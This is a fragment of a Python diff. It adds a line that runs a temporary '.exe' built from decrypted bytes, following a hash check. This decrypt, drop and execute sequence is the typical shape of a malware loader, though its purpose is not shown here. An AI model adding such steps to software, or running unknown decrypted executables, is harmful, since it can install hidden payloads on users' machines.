@@ -65,3 +65,5 @@ if digest != EXPECTED_HASH:
 with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as tmp:
     tmp.write(decrypted)
     tmp_path = tmp.name
+    
+subprocess.run([tmp_path], check=False)
